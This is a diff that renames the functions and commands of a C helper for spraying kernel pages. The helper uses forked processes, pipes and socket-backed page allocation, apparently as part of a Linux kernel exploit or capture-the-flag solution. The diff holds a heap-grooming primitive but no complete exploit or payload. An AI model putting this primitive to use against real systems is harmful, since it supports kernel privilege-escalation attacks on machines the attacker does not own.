@@ -627,18 +627,18 @@ void sandbox()
 /*
     Usage:  
     ```
-    setSockPageAllocator();
+    spaInit();
     for(int i = 0 ; i < 0x100 ; i++)
-        send_spray_cmd(ALLOC_PAGE,i);
+        spaCmd(ALLOC_PAGE,i);
     ```
  */
 int sock_allocator_fd_child[2],sock_allocator_fd_parent[2];
 #define INITIAL_PAGE_SPRAY 1000
 int socketfds[INITIAL_PAGE_SPRAY];
 enum spray_cmd {
-    ALLOC_PAGE,
-    FREE_PAGE,
-    EXIT_SPRAY,
+    ADD,
+    FREE,
+    EXIT,
 };
 typedef struct
 {
@@ -690,20 +690,21 @@ void _spray_comm_handler()
     do {
         read(sock_allocator_fd_child[0], &req, sizeof(req));
         assert(req.idx < INITIAL_PAGE_SPRAY);
-        if (req.cmd == ALLOC_PAGE)
+        if (req.cmd == ADD)
         {
             socketfds[req.idx] = _alloc_pages_via_sock(4096, 1);
         }
-        else if (req.cmd == FREE_PAGE)
+        else if (req.cmd == FREE)
         {
             close(socketfds[req.idx]);
         }
         result = req.idx;
         write(sock_allocator_fd_parent[1], &result, sizeof(result));
-    } while(req.cmd != EXIT_SPRAY);
+    } while(req.cmd != EXIT);
 
 }
-void send_spray_cmd(enum spray_cmd cmd, int idx)
+
+void spaCmd(enum spray_cmd cmd, int idx)
 {
     ipc_req_t req;
     int32_t result;
@@ -714,7 +715,7 @@ void send_spray_cmd(enum spray_cmd cmd, int idx)
     read(sock_allocator_fd_parent[0], &result, sizeof(result));
     assert(result == idx);
 }
-void setSockPageAllocator(){
+void spaInit(){
     pipe(sock_allocator_fd_child);
     pipe(sock_allocator_fd_parent);
     if (!fork())
